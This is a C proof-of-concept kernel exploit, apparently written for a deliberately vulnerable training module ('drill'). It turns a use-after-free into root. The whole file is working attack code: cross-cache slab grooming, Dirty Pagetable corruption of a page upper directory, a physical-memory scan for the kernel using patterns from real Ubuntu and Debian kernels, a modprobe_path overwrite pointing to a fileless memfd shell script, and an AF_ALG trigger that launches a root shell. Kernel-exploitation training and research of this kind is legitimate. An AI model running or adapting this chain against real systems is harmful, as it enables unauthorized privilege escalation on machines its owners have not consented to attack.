/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * This PoC performs the Dirty Pagetable attack via huge pages and gains LPE.
 *
 * Requirements:
 *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
 *  2) Ensure that KERNEL_PATTERNS_STR contains the first bytes of _text of your kernel
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <linux/limits.h>
#include "drill.h"

int do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #0\n");
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - prepare the page table infrastructure
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - create a page table to reclaim the freed memory
 *  - perform uaf write using the dangling reference
 *  - change modprobe_path using the overwritten page table
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

#define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
#define PMD_INDEX_TO_VIRT(i) ((unsigned long)i << 21)
#define PUD_INDEX_TO_VIRT(i) ((unsigned long)i << 30)
#define PGD_INDEX_TO_VIRT(i) ((unsigned long)i << 39)
#define PT_INDICES_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, page_index) \
		(void *)(PGD_INDEX_TO_VIRT(pgd_index) + \
			 PUD_INDEX_TO_VIRT(pud_index) + \
			 PMD_INDEX_TO_VIRT(pmd_index) + \
			 PTE_INDEX_TO_VIRT(pte_index) + \
			 (unsigned long)page_index)

#define PT_ENTRIES (PAGE_SIZE / 8)

/* From include/linux/huge_mm.h */
#define PUD_SIZE (1UL << 30)

/* Page table bits: Huge | Dirty | Accessed | User | Write | Present */
#define PT_BITS 0xe7lu

#define PGD_N 64

#define MAGIC_VAL 0xc001c0ffeebadbadlu

int prepare_page_tables(void)
{
	unsigned long *addr = NULL;
	long i = 0;

	printf("[!] preparing page tables\n");

	/*
	 * Prepare the resources for PUD that will later reclaim
	 * the freed slab containing UAF object.
	 */
	for (i = 0; i < PT_ENTRIES; i++) {
		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		if (addr == MAP_FAILED) {
			perror("[-] mmap");
			return EXIT_FAILURE;
		}
	}
	printf("[+] mmap 1: from %p to %p\n",
			PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0),
			PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));

	return EXIT_SUCCESS;
}

#define TLB_FLUSH_IN_PROGRESS 0
#define TLB_FLUSH_DONE 1

/* See https://pwning.tech/nftables/#47-tlb-flushing */
int flush_tlb(void *addr, size_t len)
{
	short *status = NULL;

	status = mmap(NULL, sizeof(short), PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (status == MAP_FAILED) {
		perror("[-] mmap");
		return EXIT_FAILURE;
	}

	*status = TLB_FLUSH_IN_PROGRESS;

	if (fork() == 0) {
		munmap(addr, len);
		*status = TLB_FLUSH_DONE;
		exit(EXIT_SUCCESS);
	}

	while (*status != TLB_FLUSH_DONE)
		usleep(10000);

	munmap(status, sizeof(short));

	printf("[+] TLB is flushed\n");

	return EXIT_SUCCESS;
}

/*
 * Overwrite one entry in PUD, which reclaimed the UAF memory.
 * This entry will point to a GiB huge page.
 */
int uaf_write(unsigned long phys_addr, long uaf_n, int act_fd)
{
	char act_args[DRILL_ACT_SIZE] = { 0 };
	int ret = EXIT_FAILURE;

	/* DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16 */
	snprintf(act_args, sizeof(act_args), "0x%lx 0", phys_addr);
	printf("[!] writing phys addreses to the PUD: %lx - %lx\n", phys_addr - PT_BITS,
	       phys_addr - PT_BITS + PUD_SIZE);

	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, act_args);
	if (ret == EXIT_FAILURE)
		return EXIT_FAILURE;

	printf("[+] DRILL_ACT_SAVE_VAL\n");

	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PT_ENTRIES * PUD_SIZE);
	if (ret == EXIT_FAILURE)
		return EXIT_FAILURE;

	return EXIT_SUCCESS;
}

/* From include/linux/kmod.h */
#define KMOD_PATH_LEN 256

int get_modprobe_path(char *buf, size_t buf_size)
{
	int fd = -1;
	ssize_t bytes = 0;
	int ret = EXIT_FAILURE;
	size_t len = 0;

	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	if (fd < 0) {
		perror("[-] open modprobe");
		return EXIT_FAILURE;
	}

	bytes = read(fd, buf, buf_size);
	buf[buf_size - 1] = 0;

	ret = close(fd);
	if (ret != 0)
		perror("[-] close modprobe");

	if (bytes < 0) {
		perror("[-] read modprobe");
		return EXIT_FAILURE;
	}

	len = strlen(buf);
	if (len < 1) {
		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	if (buf[len - 1] != '\n') {
		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	buf[len - 1] = 0; /* skip the line feed '\n' */

	return EXIT_SUCCESS;
}

/*
* First 16 bytes of kernel_text segment
* True for:
* 1. Dozens of v6.x.x defconfig kernels
* 2. Ubuntu 6.12.28; 6.6.89; 6.10.11
* 3. Debian 6.12.25; 6.11.6; 6.1.10
* We search for kernel_text first because
* it is always aligned by CONFIG_PHYSICAL_ALIGN
*/
#define KERNEL_PATTERNS_STR                                                   \
	{ "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\xb9\x01\x01\x00\xc0\x48", \
	  "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\x48\x8d\x3d\xef\xff\xff", \
	  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", \
	  "\xfc\x0f\x01\x15\xa0\xdc\x77\x03\xb8\x10\x00\x00\x00\x8e\xd8\x8e", \
	  "\x48\x8d\x25\x51\x3f\xa0\x01\x48\x8d\x3d\xf2\xff\xff\xff\xb9\x01" }

#define KERNEL_PATTERN_COUNT 5
#define KERNEL_PATTERN_LEN 16

int is_kernel_base(const void *addr)
{
	static const char *patterns[] = KERNEL_PATTERNS_STR;

	for (size_t i = 0; i < KERNEL_PATTERN_COUNT; i++) {
		if (memcmp(addr, patterns[i], KERNEL_PATTERN_LEN) == 0)
			return 1;
	}
	return 0;
}

#define CONFIG_PHYSICAL_ALIGN 0x200000

void *guess_modprobe(void *memory, size_t memory_size, char *modprobe_path, size_t modprobe_buf_len,
		     size_t modprobe_path_len)
{
	char *search = NULL;
	char *base;
	char *end = (char *)memory + memory_size;
	char *modprobe_path_uaddr = NULL;

	for (base = memory; base < end; base += CONFIG_PHYSICAL_ALIGN) {
		if (!is_kernel_base(base))
			continue;

		for (search = base; search < end;) {
			modprobe_path_uaddr = memmem(search, end - search,
				       modprobe_path, modprobe_path_len);
			if (!modprobe_path_uaddr)
				break;

			printf("[+] modprobe_path candidate at %p\n", modprobe_path_uaddr);

			/* Test overwrite */
			modprobe_path_uaddr[0] = 'x';
			if (get_modprobe_path(modprobe_path, modprobe_buf_len))
				return NULL;

			if (modprobe_path[0] != 'x') {
				printf("[-] testing modprobe_path overwriting failed, searching for the next one\n");
				modprobe_path_uaddr[0] = '/';
				search = modprobe_path_uaddr + 1;
				continue;
			}

			/* Return the initial value back for now */
			modprobe_path_uaddr[0] = '/';
			printf("[+] testing modprobe_path overwriting succeeded\n");
			return modprobe_path_uaddr;
		}
	}

	printf("[!] kernel not found in this area\n");
	return NULL;
}

/* Fileless approach */
int prepare_privesc_script(char *path, size_t path_size)
{
	pid_t pid = getpid();
	int script_fd = -1;
	int shell_stdin_fd = -1;
	int shell_stdout_fd = -1;
	int ret = EXIT_FAILURE;

	script_fd = memfd_create("", MFD_CLOEXEC);
	if (script_fd < 0) {
		perror("[-] memfd_create");
		return EXIT_FAILURE;
	}

	shell_stdin_fd = dup(STDIN_FILENO);
	if (shell_stdin_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	shell_stdout_fd = dup(STDOUT_FILENO);
	if (shell_stdout_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	ret = dprintf(script_fd,
		      "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
		      pid, shell_stdin_fd,
		      pid, shell_stdout_fd);
	if (ret < 0) {
		perror("[-] dprintf for privesc_script");
		return EXIT_FAILURE;
	}

	ret = lseek(script_fd, 0, SEEK_SET);
	if (ret < 0) {
		perror("[-] lseek for privesc_script");
		return EXIT_FAILURE;
	}

	ret = snprintf(path, path_size, "/proc/%i/fd/%i", pid, script_fd);
	if (ret < 0) {
		perror("[-] snprintf for privesc_script path");
		return EXIT_FAILURE;
	}
	if (ret >= path_size) {
		printf("[-] snprintf for privesc_script path: truncated\n");
		return EXIT_FAILURE;
	}

	printf("[+] privesc script is prepared at %s\n", path);
	return EXIT_SUCCESS;
}

/* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
void trigger_modprobe_sock(void)
{
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "dummy"
	};
	int alg_fd = -1;

	printf("[!] gonna trigger modprobe using AF_ALG socket and launch the root shell\n");
	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
	printf("[!] root shell is finished\n");

	if (alg_fd >= 0) {
		if (close(alg_fd) < 0)
			perror("[-] close alg_fd");
	}
}

int main(void)
{
	int result = EXIT_FAILURE;
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
	char modprobe_path[KMOD_PATH_LEN] = { 0 };
	unsigned long phys_addr;
	size_t modprobe_path_len = 0;
	struct sysinfo info;
	int ram_gb;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	/* to prevent physical memory OOB */
	if (sysinfo(&info) != 0) {
		perror("[!] sysinfo, setup ram_gb manually");
		goto end;
	}
	ram_gb = ((info.totalram * info.mem_unit / (1024 * 1024)) + 1023) / 1024;

	ret = prepare_page_tables();
	if (ret == EXIT_FAILURE)
		goto end;

	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path));
	if (ret == EXIT_FAILURE)
		goto end;

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning() == EXIT_FAILURE)
		goto end;

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go for page table\n");

	printf("[!] create a page table to reclaim the freed memory\n");
	for (i = 0; i < PT_ENTRIES; i++) {
		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);

		/* Allocate and populate a new PUD */
		*addr = MAGIC_VAL;
	}
	printf("[+] PUD has been created\n");

	printf("[!] perform uaf write using the dangling reference\n");

	/* choose "0x0 + flags" as starting adress */
	phys_addr = PT_BITS;
	ret = uaf_write(phys_addr, uaf_n, act_fd);
	if (ret == EXIT_FAILURE)
		goto end;

	for (int i = 0; i < PT_ENTRIES; i++) {
		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);
		unsigned long val = *addr;
		char *modprobe_path_uaddr = NULL;
		size_t new_len = 0;

		if (val == MAGIC_VAL)
			continue;

		printf("[+] corrupted PUD entry is detected, now search modprobe addr\n");

		/* extract modprobe_path */
		if (get_modprobe_path(modprobe_path, sizeof(modprobe_path)))
			goto end;

		modprobe_path_len = strlen(modprobe_path);

		for (int j = 0; j < ram_gb; j++) {
			modprobe_path_uaddr = guess_modprobe(addr, PUD_SIZE, modprobe_path,
							     sizeof(modprobe_path),
							     modprobe_path_len);
			if (modprobe_path_uaddr != NULL)
				break;

			phys_addr += PUD_SIZE;
			ret = uaf_write(phys_addr, uaf_n, act_fd);
			if (ret == EXIT_FAILURE)
				goto end;
		}

		if (modprobe_path_uaddr == NULL)
			break;

		new_len = strlen(privesc_script_path);
		if (new_len + 1 > KMOD_PATH_LEN) {
			printf("[-] not enough bytes in modprobe_path\n");
			break;
		}

		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);

		/* Launch the root shell */
		trigger_modprobe_sock();
		result = EXIT_SUCCESS;
		goto end; /* root shell is finished */
	}

	printf("[-] failed to find / overwrite / trigger modprobe\n");

end:
	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	return result;
}
